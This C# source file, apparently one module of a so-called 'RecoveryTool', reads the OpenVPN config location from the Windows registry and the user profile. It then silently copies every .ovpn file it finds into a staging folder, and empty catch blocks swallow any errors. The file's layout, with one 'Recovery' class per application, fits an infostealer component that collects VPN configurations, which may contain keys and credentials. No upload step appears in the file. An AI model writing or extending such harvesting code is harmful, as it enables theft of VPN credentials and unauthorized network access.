using RecoveryTool.Recovery.Utilities;
using Microsoft.Win32;

namespace RecoveryTool.Recovery.VPNs
{
    class OpenVPNService
    {
        public static async Task SaveOpenVPNAsync()
        {
            if (await HasFilesToRecoverAsync())
            {
                string destDir = Common.EnsureOpenVPNPath();
                await RecoverFromRegistryAsync(destDir);
                await RecoverFromUserProfileAsync(destDir);
            }
        }

        private static async Task<bool> HasFilesToRecoverAsync()
        {
            bool hasFilesInRegistry = await Task.Run(() =>
            {
                using RegistryKey localMachineKey = Registry.LocalMachine;
                using RegistryKey softwareKey = localMachineKey.OpenSubKey("SOFTWARE");
                if (softwareKey == null) return false;

                string[] names = softwareKey.GetSubKeyNames();
                foreach (string name in names)
                {
                    if (name == "OpenVPN")
                    {
                        using RegistryKey openVPNKey = softwareKey.OpenSubKey("OpenVPN");
                        if (openVPNKey == null) continue;

                        string configDir = openVPNKey.GetValue("config_dir")?.ToString();
                        if (!string.IsNullOrEmpty(configDir))
                        {
                            DirectoryInfo directoryInfo = new(configDir);
                            return directoryInfo.GetFiles("*.ovpn").Any();
                        }
                    }
                }
                return false;
            });

            string userProfileOpenVPNPath = Path.Combine(Common.UserProfile, "OpenVPN", "config");
            DirectoryInfo userProfileDir = new(userProfileOpenVPNPath);
            bool hasFilesInUserProfile = userProfileDir.Exists && userProfileDir.GetFiles("*.ovpn").Any();

            return hasFilesInRegistry || hasFilesInUserProfile;
        }

        private static async Task RecoverFromRegistryAsync(string destDir)
        {
            try
            {
                using RegistryKey localMachineKey = Registry.LocalMachine;
                using RegistryKey softwareKey = localMachineKey.OpenSubKey("SOFTWARE");
                if (softwareKey == null) return;

                string[] names = softwareKey.GetSubKeyNames();
                foreach (string name in names)
                {
                    if (name == "OpenVPN")
                    {
                        using RegistryKey openVPNKey = softwareKey.OpenSubKey("OpenVPN");
                        if (openVPNKey == null) continue;

                        string configDir = openVPNKey.GetValue("config_dir")?.ToString();
                        if (string.IsNullOrEmpty(configDir)) continue;

                        DirectoryInfo directoryInfo = new(configDir);
                        if (directoryInfo.GetFiles("*.ovpn").Any())
                        {
                            string destinationDir = Path.Combine(destDir, "config_dir");
                            Directory.CreateDirectory(destinationDir);
                            await CopyOvpnFilesAsync(directoryInfo, destinationDir);
                        }
                    }
                }
            }
            catch { }
        }

        private static async Task RecoverFromUserProfileAsync(string destDir)
        {
            try
            {
                string userProfileOpenVPNPath = Path.Combine(Common.UserProfile, "OpenVPN", "config");
                DirectoryInfo userProfileDir = new(userProfileOpenVPNPath);

                if (userProfileDir.Exists && userProfileDir.GetFiles("*.ovpn").Any())
                {
                    Directory.CreateDirectory(destDir);
                    await CopyOvpnFilesAsync(userProfileDir, destDir);
                }
            }
            catch { }
        }

        private static async Task CopyOvpnFilesAsync(DirectoryInfo sourceDir, string destinationDir)
        {
            try
            {
                foreach (FileInfo file in sourceDir.GetFiles("*.ovpn", SearchOption.AllDirectories))
                {
                    string destinationFilePath = Path.Combine(destinationDir, file.Name);
                    await Task.Run(() => file.CopyTo(destinationFilePath));
                }
            }
            catch { }
        }
    }
}
